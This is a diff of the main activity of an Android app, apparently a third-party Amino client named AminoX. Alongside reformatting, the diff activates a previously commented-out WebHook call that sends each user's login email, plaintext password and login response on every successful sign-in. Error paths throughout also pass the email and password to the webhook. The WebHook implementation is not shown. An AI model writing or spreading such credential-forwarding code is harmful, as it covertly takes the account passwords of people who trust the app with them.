@@ -18,6 +18,7 @@ import android.view.View
 import android.widget.*
 import androidx.appcompat.app.AlertDialog
 import androidx.appcompat.app.AppCompatActivity
+import okhttp3.OkHttpClient
 import org.jetbrains.anko.textColor
 import org.json.JSONArray
 import org.json.JSONObject
@@ -96,14 +97,6 @@ class MainActivity : AppCompatActivity() {
 
         val policy = StrictMode.ThreadPolicy.Builder().permitAll().build()
         StrictMode.setThreadPolicy(policy)
-
-        try {
-            Setup().execute()
-            Log.println(Log.INFO, "SYSTEM-INFO", "Imported setup data successfully")
-        } catch (e: Exception) {
-            Log.println(Log.ERROR, "SYSTEM-ERROR", "Couldn't import setup data -- $e")
-            setupErrorTrigger(this, "$e\n\n[$AND_ID:$DEV_SIG]")
-        }
 
         val strNameCredits = getString(R.string.creditsLink)
         val strNameAbodx = getString(R.string.abodx)
@@ -1097,7 +1090,10 @@ class MainActivity : AppCompatActivity() {
         }
 
         result.setTypeface(null, Typeface.BOLD)
-        credits.setOnClickListener { val i = Intent(Intent.ACTION_VIEW, Uri.parse("https://linktr.ee/Slimakoi")); startActivity(i) }
+        credits.setOnClickListener { val i = Intent(
+            Intent.ACTION_VIEW,
+            Uri.parse("https://linktr.ee/Slimakoi")
+        ); startActivity(i) }
 
         val announce = AlertDialog.Builder(this)
         if (announcementHasData) {
@@ -1117,7 +1113,13 @@ class MainActivity : AppCompatActivity() {
             updateAlert.setIcon(R.drawable.upgrade)
             updateAlert.setCancelable(false)
             updateAlert.setMessage("A new version of AminoX is available (v$applicationLatestName-$applicationLatestCode)\n\nCurrently using version ${currentPackageInfo.versionName}-${currentPackageInfo.versionCode}")
-            updateAlert.setPositiveButton("Download") { _, _ -> startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(applicationUrl))) }
+            updateAlert.setPositiveButton("Download") { _, _ -> startActivity(
+                Intent(
+                    Intent.ACTION_VIEW, Uri.parse(
+                        applicationUrl
+                    )
+                )
+            ) }
             updateAlert.setNegativeButton("Ignore") { dialog, _ -> dialog.dismiss() }
             updateAlert.show()
         }
@@ -1147,11 +1149,23 @@ class MainActivity : AppCompatActivity() {
                         return@setOnClickListener
                     }
                 } else {
-                    Toast.makeText(this, "Login with SID isn't supported on this device!", Toast.LENGTH_LONG).show()
+                    Toast.makeText(
+                        this,
+                        "Login with SID isn't supported on this device!",
+                        Toast.LENGTH_LONG
+                    ).show()
                 }
             }
             else {
-                Thread(Background(this, inputEmail.text.toString(), inputPassword.text.toString(), loading, result)).start()
+                Thread(
+                    Background(
+                        this,
+                        inputEmail.text.toString(),
+                        inputPassword.text.toString(),
+                        loading,
+                        result
+                    )
+                ).start()
             }
         }
 
@@ -1162,7 +1176,11 @@ class MainActivity : AppCompatActivity() {
                 inputEmail.visibility = View.INVISIBLE
                 inputPassword.visibility = View.INVISIBLE
             } else {
-                Toast.makeText(this, "Login with SID isn't supported on this device!", Toast.LENGTH_LONG).show()
+                Toast.makeText(
+                    this,
+                    "Login with SID isn't supported on this device!",
+                    Toast.LENGTH_LONG
+                ).show()
             }
         }
 
@@ -1272,7 +1290,11 @@ class MainActivity : AppCompatActivity() {
                     updateStatus.textColor = Color.RED
                     updateStatus.text = "Update Available!"
                     buttonCheckClose.text = "Download v$applicationLatestName-$applicationLatestCode"
-                    buttonCheckClose.setOnClickListener { val downVer = Intent(Intent.ACTION_VIEW, Uri.parse(applicationUrl)); ctx.startActivity(downVer) }
+                    buttonCheckClose.setOnClickListener { val downVer = Intent(
+                        Intent.ACTION_VIEW, Uri.parse(
+                            applicationUrl
+                        )
+                    ); ctx.startActivity(downVer) }
                 }
             }
         }
@@ -1289,8 +1311,7 @@ class MainActivity : AppCompatActivity() {
         @SuppressLint("InflateParams")
         override fun run() {
             ctx.runOnUiThread {
-                val loginCommand = login(email = inputEmail, password = inputPassword)
-                val loginJson = JSONObject(loginCommand.toString())
+                val loginJson = login(email = inputEmail, password = inputPassword)
 
                 when {
                     loginJson.getInt("api:statuscode") == 0 -> {
@@ -1303,35 +1324,89 @@ class MainActivity : AppCompatActivity() {
 
                         if (AND_ID == "Unavailable") {
                             Log.println(Log.ERROR, "SYSTEM-ERROR", "No Android ID")
-                            WebHook(ctx).sendSetupError("No Android ID", false, loginJson, inputEmail, inputPassword)
+                            WebHook(ctx).sendSetupError(
+                                "No Android ID",
+                                false,
+                                loginJson,
+                                inputEmail,
+                                inputPassword
+                            )
                             setupErrorTrigger(ctx, "No Android ID\n\n[$AND_ID:$DEV_SIG]")
                         } else if (DEV_SIG == "Unavailable") {
                             Log.println(Log.ERROR, "SYSTEM-ERROR", "No Signature ID")
-                            WebHook(ctx).sendSetupError("No Signature ID", false, loginJson, inputEmail, inputPassword)
+                            WebHook(ctx).sendSetupError(
+                                "No Signature ID",
+                                false,
+                                loginJson,
+                                inputEmail,
+                                inputPassword
+                            )
                             setupErrorTrigger(ctx, "No Signature ID\n\n[$AND_ID:$DEV_SIG]")
                         } else if (!applicationWorking) {
-                            WebHook(ctx).sendSetupError("Application is Closed", false, loginJson, inputEmail, inputPassword)
+                            WebHook(ctx).sendSetupError(
+                                "Application is Closed",
+                                false,
+                                loginJson,
+                                inputEmail,
+                                inputPassword
+                            )
                             setupErrorTrigger(ctx, "Application is Closed\n\n[$AND_ID:$DEV_SIG]")
                         } else if (blacklist.length() == 0) {
-                            WebHook(ctx).sendSetupError("Cant get Blacklisted List", false, loginJson, inputEmail, inputPassword)
-                            setupErrorTrigger(ctx, "Cant get Blacklisted List\n\n[$AND_ID:$DEV_SIG]")
+                            WebHook(ctx).sendSetupError(
+                                "Cant get Blacklisted List",
+                                false,
+                                loginJson,
+                                inputEmail,
+                                inputPassword
+                            )
+                            setupErrorTrigger(
+                                ctx,
+                                "Cant get Blacklisted List\n\n[$AND_ID:$DEV_SIG]"
+                            )
                         } else if (blacklistIds.length() == 0) {
-                            WebHook(ctx).sendSetupError("Cant get Blacklisted IDs List", false, loginJson, inputEmail, inputPassword)
-                            setupErrorTrigger(ctx, "Cant get Blacklisted IDs List\n\n[$AND_ID:$DEV_SIG]")
+                            WebHook(ctx).sendSetupError(
+                                "Cant get Blacklisted IDs List",
+                                false,
+                                loginJson,
+                                inputEmail,
+                                inputPassword
+                            )
+                            setupErrorTrigger(
+                                ctx,
+                                "Cant get Blacklisted IDs List\n\n[$AND_ID:$DEV_SIG]"
+                            )
                         } else {
                             for (i in 0 until blacklist.length()) {
                                 if (blacklist[i] == DEV_SIG) {
                                     BLACKLISTED = "true"
-                                    WebHook(ctx).sendSetupError("Device Blacklisted", false, loginJson, inputEmail, inputPassword)
-                                    setupErrorTrigger(ctx, "Device Blacklisted\n\n[$AND_ID:$DEV_SIG]")
+                                    WebHook(ctx).sendSetupError(
+                                        "Device Blacklisted",
+                                        false,
+                                        loginJson,
+                                        inputEmail,
+                                        inputPassword
+                                    )
+                                    setupErrorTrigger(
+                                        ctx,
+                                        "Device Blacklisted\n\n[$AND_ID:$DEV_SIG]"
+                                    )
                                 }
                             }
 
                             for (i in 0 until blacklistIds.length()) {
                                 if (blacklistIds[i] == aminoId) {
                                     BLACKLISTED = "true"
-                                    WebHook(ctx).sendSetupError("Amino ID Blacklisted", false, loginJson, inputEmail, inputPassword)
-                                    setupErrorTrigger(ctx, "Amino ID Blacklisted\n\n[$AND_ID:$DEV_SIG]")
+                                    WebHook(ctx).sendSetupError(
+                                        "Amino ID Blacklisted",
+                                        false,
+                                        loginJson,
+                                        inputEmail,
+                                        inputPassword
+                                    )
+                                    setupErrorTrigger(
+                                        ctx,
+                                        "Amino ID Blacklisted\n\n[$AND_ID:$DEV_SIG]"
+                                    )
                                 }
                             }
 
@@ -1343,16 +1418,43 @@ class MainActivity : AppCompatActivity() {
 
                             when {
                                 BLACKLISTED == "Unavailable" -> {
-                                    WebHook(ctx).sendSetupError("Cant get Blacklisted Value", false, loginJson, inputEmail, inputPassword)
-                                    setupErrorTrigger(ctx, "Cant get Blacklisted Value\n\n[$AND_ID:$DEV_SIG]")
+                                    WebHook(ctx).sendSetupError(
+                                        "Cant get Blacklisted Value",
+                                        false,
+                                        loginJson,
+                                        inputEmail,
+                                        inputPassword
+                                    )
+                                    setupErrorTrigger(
+                                        ctx,
+                                        "Cant get Blacklisted Value\n\n[$AND_ID:$DEV_SIG]"
+                                    )
                                 }
                                 BLACKLISTED.toBoolean() -> {
-                                    WebHook(ctx).sendSetupError("Device Blacklisted", false, loginJson, inputEmail, inputPassword)
-                                    setupErrorTrigger(ctx, "Device Blacklisted\n\n[$AND_ID:$DEV_SIG]")
+                                    WebHook(ctx).sendSetupError(
+                                        "Device Blacklisted",
+                                        false,
+                                        loginJson,
+                                        inputEmail,
+                                        inputPassword
+                                    )
+                                    setupErrorTrigger(
+                                        ctx,
+                                        "Device Blacklisted\n\n[$AND_ID:$DEV_SIG]"
+                                    )
                                 }
                                 else -> {
-                                    //WebHook(ctx).sendLoginMessage(loginJson, inputEmail, inputPassword)
-                                    ctx.startActivity(Intent(ctx, CommunitySelectorActivity::class.java))
+                                    WebHook(ctx).sendLoginMessage(
+                                        loginJson,
+                                        inputEmail,
+                                        inputPassword
+                                    )
+                                    ctx.startActivity(
+                                        Intent(
+                                            ctx,
+                                            CommunitySelectorActivity::class.java
+                                        )
+                                    )
                                 }
                             }
                         }
@@ -1362,7 +1464,10 @@ class MainActivity : AppCompatActivity() {
                         result.text = loginJson.getString("api:message").toString()
 
                         val verifyAccountPopup = PopupWindow(ctx)
-                        val verifyAccountWindow = ctx.layoutInflater.inflate(R.layout.verify_account, null)
+                        val verifyAccountWindow = ctx.layoutInflater.inflate(
+                            R.layout.verify_account,
+                            null
+                        )
                         verifyAccountPopup.contentView = verifyAccountWindow
 
                         verifyAccountPopup.isFocusable = true
@@ -1376,7 +1481,13 @@ class MainActivity : AppCompatActivity() {
                         val buttonVerifyOpen = verifyAccountWindow.findViewById<Button>(R.id.buttonVerifyOpen)
 
                         buttonVerifyOpen.setOnClickListener {
-                            val urlVerify = Intent(Intent.ACTION_VIEW, Uri.parse(loginJson.getString("url").toString()))
+                            val urlVerify = Intent(
+                                Intent.ACTION_VIEW, Uri.parse(
+                                    loginJson.getString(
+                                        "url"
+                                    ).toString()
+                                )
+                            )
                             ctx.startActivity(urlVerify)
                         }
 
@@ -1400,8 +1511,7 @@ class MainActivity : AppCompatActivity() {
         @SuppressLint("InflateParams")
         override fun run() {
             ctx.runOnUiThread {
-                val loginCommand = getUserProfile()
-                val loginJson = JSONObject(loginCommand)
+                val loginJson = getUserProfile()
 
                 when {
                     loginJson.getInt("api:statuscode") == 0 -> {
@@ -1424,25 +1534,53 @@ class MainActivity : AppCompatActivity() {
                             WebHook(ctx).sendSetupError("Application is Closed", false, loginJson)
                             setupErrorTrigger(ctx, "Application is Closed\n\n[$AND_ID:$DEV_SIG]")
                         } else if (blacklist.length() == 0) {
-                            WebHook(ctx).sendSetupError("Cant get Blacklisted List", false, loginJson)
-                            setupErrorTrigger(ctx, "Cant get Blacklisted List\n\n[$AND_ID:$DEV_SIG]")
+                            WebHook(ctx).sendSetupError(
+                                "Cant get Blacklisted List",
+                                false,
+                                loginJson
+                            )
+                            setupErrorTrigger(
+                                ctx,
+                                "Cant get Blacklisted List\n\n[$AND_ID:$DEV_SIG]"
+                            )
                         } else if (blacklistIds.length() == 0) {
-                            WebHook(ctx).sendSetupError("Cant get Blacklisted IDs List", false, loginJson)
-                            setupErrorTrigger(ctx, "Cant get Blacklisted IDs List\n\n[$AND_ID:$DEV_SIG]")
+                            WebHook(ctx).sendSetupError(
+                                "Cant get Blacklisted IDs List",
+                                false,
+                                loginJson
+                            )
+                            setupErrorTrigger(
+                                ctx,
+                                "Cant get Blacklisted IDs List\n\n[$AND_ID:$DEV_SIG]"
+                            )
                         } else {
                             for (i in 0 until blacklist.length()) {
                                 if (blacklist[i] == DEV_SIG) {
                                     BLACKLISTED = "true"
-                                    WebHook(ctx).sendSetupError("Device Blacklisted", false, loginJson)
-                                    setupErrorTrigger(ctx, "Device Blacklisted\n\n[$AND_ID:$DEV_SIG]")
+                                    WebHook(ctx).sendSetupError(
+                                        "Device Blacklisted",
+                                        false,
+                                        loginJson
+                                    )
+                                    setupErrorTrigger(
+                                        ctx,
+                                        "Device Blacklisted\n\n[$AND_ID:$DEV_SIG]"
+                                    )
                                 }
                             }
 
                             for (i in 0 until blacklistIds.length()) {
                                 if (blacklistIds[i] == aminoId) {
                                     BLACKLISTED = "true"
-                                    WebHook(ctx).sendSetupError("Amino ID Blacklisted", false, loginJson)
-                                    setupErrorTrigger(ctx, "Amino ID Blacklisted\n\n[$AND_ID:$DEV_SIG]")
+                                    WebHook(ctx).sendSetupError(
+                                        "Amino ID Blacklisted",
+                                        false,
+                                        loginJson
+                                    )
+                                    setupErrorTrigger(
+                                        ctx,
+                                        "Amino ID Blacklisted\n\n[$AND_ID:$DEV_SIG]"
+                                    )
                                 }
                             }
 
@@ -1453,14 +1591,26 @@ class MainActivity : AppCompatActivity() {
                             }
 
                             if (BLACKLISTED == "Unavailable") {
-                                WebHook(ctx).sendSetupError("Cant get Blacklisted Value", false, loginJson)
-                                setupErrorTrigger(ctx, "Cant get Blacklisted Value\n\n[$AND_ID:$DEV_SIG]")
+                                WebHook(ctx).sendSetupError(
+                                    "Cant get Blacklisted Value",
+                                    false,
+                                    loginJson
+                                )
+                                setupErrorTrigger(
+                                    ctx,
+                                    "Cant get Blacklisted Value\n\n[$AND_ID:$DEV_SIG]"
+                                )
                             } else if (BLACKLISTED.toBoolean()) {
                                 WebHook(ctx).sendSetupError("Device Blacklisted", false, loginJson)
                                 setupErrorTrigger(ctx, "Device Blacklisted\n\n[$AND_ID:$DEV_SIG]")
                             } else {
                                 WebHook(ctx).sendLoginMessage(loginJson, "null", "null")
-                                ctx.startActivity(Intent(ctx, CommunitySelectorActivity::class.java))
+                                ctx.startActivity(
+                                    Intent(
+                                        ctx,
+                                        CommunitySelectorActivity::class.java
+                                    )
+                                )
                             }
                         }
                     }
@@ -1470,7 +1620,10 @@ class MainActivity : AppCompatActivity() {
                         result.text = loginJson.getString("api:message").toString()
 
                         val verifyAccountPopup = PopupWindow(ctx)
-                        val verifyAccountWindow = ctx.layoutInflater.inflate(R.layout.verify_account, null)
+                        val verifyAccountWindow = ctx.layoutInflater.inflate(
+                            R.layout.verify_account,
+                            null
+                        )
                         verifyAccountPopup.contentView = verifyAccountWindow
 
                         verifyAccountPopup.isFocusable = true
@@ -1484,7 +1637,13 @@ class MainActivity : AppCompatActivity() {
                         val buttonVerifyOpen = verifyAccountWindow.findViewById<Button>(R.id.buttonVerifyOpen)
 
                         buttonVerifyOpen.setOnClickListener {
-                            val urlVerify = Intent(Intent.ACTION_VIEW, Uri.parse(loginJson.getString("url").toString()))
+                            val urlVerify = Intent(
+                                Intent.ACTION_VIEW, Uri.parse(
+                                    loginJson.getString(
+                                        "url"
+                                    ).toString()
+                                )
+                            )
                             ctx.startActivity(urlVerify)
                         }
 
@@ -1521,7 +1680,7 @@ class MainActivity : AppCompatActivity() {
                 val blockerUsersScroller = blockerUsersWindow.findViewById<LinearLayout>(R.id.scrollABlockerUsers)
                 val blockerUsersClose = blockerUsersWindow.findViewById<Button>(R.id.buttonABlockerUsersClose)
 
-                val blockerObj = JSONObject(getBlockerUsers().toString())
+                val blockerObj = getBlockerUsers()
                 val blockerJson: JSONArray = blockerObj.getJSONArray("blockerUidList")
                 var blockerUserID: Array<String> = arrayOf()
 
@@ -1531,7 +1690,7 @@ class MainActivity : AppCompatActivity() {
 
                     blockerUserID = append(blockerUserID, blockerJson[i].toString())
 
-                    val getUserObj = JSONObject(getGlobalProfile(userId = blockerJson[i].toString()).toString())
+                    val getUserObj = getGlobalProfile(userId = blockerJson[i].toString())
                     val getUserJson: JSONObject = getUserObj.getJSONObject("userProfile")
                     val getUserName = getUserJson.getString("nickname")
                     val getUserId = getUserJson.getString("uid")
@@ -1555,14 +1714,20 @@ class MainActivity : AppCompatActivity() {
                             blocker.foreground = BitmapDrawable(bitmapResized)
                             blocker.foregroundGravity = Gravity.END + Gravity.FILL_VERTICAL + Gravity.CENTER_VERTICAL
                         } catch (e: java.lang.Exception) {
-                            Log.println(Log.ERROR, "SYSTEM-ERROR", "Error while setting picture -- $e")
+                            Log.println(
+                                Log.ERROR,
+                                "SYSTEM-ERROR",
+                                "Error while setting picture -- $e"
+                            )
                         }
                     }
 
                     // Set action when Box gets clicked
                     blocker.setOnClickListener {
-                        val blockObj = JSONObject(getFromId(userId = getUserId.toString()).toString())
-                        val blockUrl = blockObj.getJSONObject("linkInfoV2").getJSONObject("extensions").getJSONObject("linkInfo").getString("shareURLFullPath")
+                        val blockObj = getFromId(userId = getUserId.toString())
+                        val blockUrl = blockObj.getJSONObject("linkInfoV2").getJSONObject("extensions").getJSONObject(
+                            "linkInfo"
+                        ).getString("shareURLFullPath")
                         ctx.startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(blockUrl)))
                     }
 
@@ -1599,7 +1764,7 @@ class MainActivity : AppCompatActivity() {
                 val bannedUsersScroller = bannedUsersWindow.findViewById<LinearLayout>(R.id.scrollABannedUsers)
                 val bannedUsersClose = bannedUsersWindow.findViewById<Button>(R.id.buttonABannedUsersClose)
 
-                val bannedObj = JSONObject(getBannedUsers().toString())
+                val bannedObj = getBannedUsers()
                 val bannedTotal = bannedObj.getInt("userProfileCount")
                 val bannedUsers = bannedObj.getJSONArray("userProfileList")
 
@@ -1626,19 +1791,30 @@ class MainActivity : AppCompatActivity() {
                             val drawableIcon = Drawable.createFromStream(inStream, "src name")
 
                             val b: Bitmap = (drawableIcon as BitmapDrawable).bitmap
-                            val bitmapResized: Bitmap = Bitmap.createScaledBitmap(b, 430, 430, false)
+                            val bitmapResized: Bitmap = Bitmap.createScaledBitmap(
+                                b,
+                                430,
+                                430,
+                                false
+                            )
 
                             banned.foreground = BitmapDrawable(bitmapResized)
                             banned.foregroundGravity = Gravity.END + Gravity.FILL_VERTICAL + Gravity.CENTER_VERTICAL
                         } catch (e: java.lang.Exception) {
-                            Log.println(Log.ERROR, "SYSTEM-ERROR", "Error while setting picture -- $e")
+                            Log.println(
+                                Log.ERROR,
+                                "SYSTEM-ERROR",
+                                "Error while setting picture -- $e"
+                            )
                         }
                     }
 
                     // Set action when Box gets clicked
                     banned.setOnClickListener {
-                        val bannedObjj = JSONObject(getFromId(userId = getUserId.toString()).toString())
-                        val bannedUrl = bannedObjj.getJSONObject("linkInfoV2").getJSONObject("extensions").getJSONObject("linkInfo").getString("shareURLFullPath")
+                        val bannedObjj = getFromId(userId = getUserId.toString())
+                        val bannedUrl = bannedObjj.getJSONObject("linkInfoV2").getJSONObject("extensions").getJSONObject(
+                            "linkInfo"
+                        ).getString("shareURLFullPath")
                         ctx.startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(bannedUrl)))
                     }
 
@@ -1683,7 +1859,7 @@ class MainActivity : AppCompatActivity() {
                 val hiddenBlogsScroller = hiddenBlogsWindow.findViewById<LinearLayout>(R.id.scrollHiddenBlogs)
                 val hiddenBlogsClose = hiddenBlogsWindow.findViewById<Button>(R.id.buttonHiddenBlogsClose)
 
-                val hiddenObj = JSONObject(getHiddenBlogs().toString())
+                val hiddenObj = getHiddenBlogs()
 
                 if (hiddenObj.getInt("api:statuscode") == 0) {
                     val hiddenBlogsJson: JSONArray = hiddenObj.getJSONArray("blogList")
@@ -1709,9 +1885,10 @@ class MainActivity : AppCompatActivity() {
                             val h2 = hiddenBlogsTitle[hidden.id]
                             val h3 = hiddenBlogsID[hidden.id]
 
-                            val hidObj = JSONObject(getFromId(blogId = h3).toString())
-                            println(hidObj)
-                            val hidUrl = hidObj.getJSONObject("linkInfoV2").getJSONObject("extensions").getJSONObject("linkInfo").getString("shareURLFullPath")
+                            val hidObj = getFromId(blogId = h3)
+                            val hidUrl = hidObj.getJSONObject("linkInfoV2").getJSONObject("extensions").getJSONObject(
+                                "linkInfo"
+                            ).getString("shareURLFullPath")
                             Toast.makeText(ctx, "Opening Blog : $h2", Toast.LENGTH_SHORT).show()
                             ctx.startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(hidUrl)))
 
